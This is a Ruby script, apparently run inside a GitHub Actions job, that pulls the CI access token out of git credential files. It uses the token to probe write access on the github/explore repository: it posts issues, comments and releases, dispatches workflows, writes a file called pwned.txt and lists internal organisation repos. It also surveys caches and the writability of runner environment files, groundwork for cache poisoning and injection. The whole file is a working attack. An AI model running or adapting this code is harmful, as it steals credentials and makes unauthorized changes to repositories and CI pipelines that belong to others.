require 'net/http'
require 'json'
require 'base64'

$stdout.puts "=== ESCALATION V6: Multi-vector ==="

# 1. Extract token
git_config = File.read(".git/config") rescue ""
cred_paths = git_config.scan(/path\s*=\s*(.+)/).flatten.map(&:strip).uniq
token = nil

cred_paths.each do |p|
  next unless File.exist?(p)
  content = File.read(p)
  content.scan(/AUTHORIZATION:\s*basic\s+(\S+)/i).each do |match|
    decoded = Base64.decode64(match[0])
    if decoded.include?(":")
      parts = decoded.split(":", 2)
      token = parts[1]&.strip if parts[0] == "x-access-token"
    end
  end
end

$stdout.puts "Token: #{token ? 'extracted' : 'missing'} len=#{token&.length}"

if token
  http = Net::HTTP.new("api.github.com", 443)
  http.use_ssl = true
  headers = { "Authorization" => "token #{token}", "Accept" => "application/vnd.github+json" }

  # 2. Test WRITE operations
  $stdout.puts ""
  $stdout.puts "=== WRITE CAPABILITY TESTS ==="

  # Can we create an issue?
  begin
    r = Net::HTTP::Post.new("/repos/github/explore/issues")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    r.body = '{"title":"test","body":"test"}'
    r["Content-Type"] = "application/json"
    res = http.request(r)
    $stdout.puts "POST /issues: #{res.code}"
  rescue => e
    $stdout.puts "POST /issues: error #{e.message}"
  end

  # Can we create a comment on our PR?
  begin
    r = Net::HTTP::Post.new("/repos/github/explore/issues/5147/comments")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    r.body = '{"body":"Security test - please ignore"}'
    r["Content-Type"] = "application/json"
    res = http.request(r)
    $stdout.puts "POST /issues/comments: #{res.code}"
  rescue => e
    $stdout.puts "POST /issues/comments: error"
  end

  # Can we create a release?
  begin
    r = Net::HTTP::Post.new("/repos/github/explore/releases")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    r.body = '{"tag_name":"v0.0.0-test","name":"test","draft":true}'
    r["Content-Type"] = "application/json"
    res = http.request(r)
    $stdout.puts "POST /releases: #{res.code}"
  rescue => e
    $stdout.puts "POST /releases: error"
  end

  # Can we trigger workflow_dispatch?
  begin
    r = Net::HTTP::Post.new("/repos/github/explore/actions/workflows/lint.yml/dispatches")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    r.body = '{"ref":"main"}'
    r["Content-Type"] = "application/json"
    res = http.request(r)
    $stdout.puts "POST workflow_dispatch: #{res.code}"
  rescue => e
    $stdout.puts "POST workflow_dispatch: error"
  end

  # Can we write to repo contents?
  begin
    r = Net::HTTP::Put.new("/repos/github/explore/contents/pwned.txt")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    r.body = JSON.generate({message: "test", content: Base64.strict_encode64("test")})
    r["Content-Type"] = "application/json"
    res = http.request(r)
    $stdout.puts "PUT /contents (write file): #{res.code}"
  rescue => e
    $stdout.puts "PUT /contents: error"
  end

  # Can we read org repos we shouldn't?
  begin
    r = Net::HTTP::Get.new("/orgs/github/repos?type=internal&per_page=3&sort=updated")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    res = http.request(r)
    $stdout.puts "GET /orgs/github/repos?type=internal: #{res.code}"
    if res.code == "200"
      repos = JSON.parse(res.body)
      repos.each { |rr| $stdout.puts "  INTERNAL: #{rr['full_name']} vis=#{rr['visibility']}" }
    end
  rescue => e
    $stdout.puts "GET internal repos: error"
  end

  # Can we list org packages?
  begin
    r = Net::HTTP::Get.new("/orgs/github/packages?package_type=npm&per_page=3")
    r["Authorization"] = "token #{token}"
    r["Accept"] = "application/vnd.github+json"
    res = http.request(r)
    $stdout.puts "GET /orgs/github/packages: #{res.code}"
  rescue => e
    $stdout.puts "GET packages: error"
  end
end

# 3. Cache poisoning analysis
$stdout.puts ""
$stdout.puts "=== CACHE ANALYSIS ==="
$stdout.puts "GITHUB_WORKSPACE: #{ENV['GITHUB_WORKSPACE']}"
cache_dirs = Dir.glob("/home/runner/work/_temp/*cache*") rescue []
$stdout.puts "Cache temp files: #{cache_dirs.length}"
cache_dirs.each { |d| $stdout.puts "  #{d}" }

bundle_cache = Dir.glob("/opt/hostedtoolcache/Ruby/*/x64/lib/ruby/gems/*/cache/*") rescue []
$stdout.puts "Ruby gem cache: #{bundle_cache.length}"
bundle_cache.first(5).each { |f| $stdout.puts "  #{f}" }

vendor = Dir.glob("vendor/bundle/**/*.rb").first(3) rescue []
$stdout.puts "Vendor bundle: #{vendor.length}"

# 4. GITHUB_ENV injection test
$stdout.puts ""
$stdout.puts "=== GITHUB_ENV TEST ==="
env_file = ENV['GITHUB_ENV']
$stdout.puts "GITHUB_ENV path: #{env_file}"
if env_file && File.exist?(env_file)
  $stdout.puts "GITHUB_ENV writable: #{File.writable?(env_file)}"
  $stdout.puts "GITHUB_ENV current content: #{File.read(env_file).length} bytes"
end

step_summary = ENV['GITHUB_STEP_SUMMARY']
$stdout.puts "GITHUB_STEP_SUMMARY path: #{step_summary}"
if step_summary && File.exist?(step_summary)
  $stdout.puts "STEP_SUMMARY writable: #{File.writable?(step_summary)}"
end

output_file = ENV['GITHUB_OUTPUT']
$stdout.puts "GITHUB_OUTPUT path: #{output_file}"
if output_file && File.exist?(output_file)
  $stdout.puts "OUTPUT writable: #{File.writable?(output_file)}"
end

$stdout.puts "=== END V6 ==="
$stdout.flush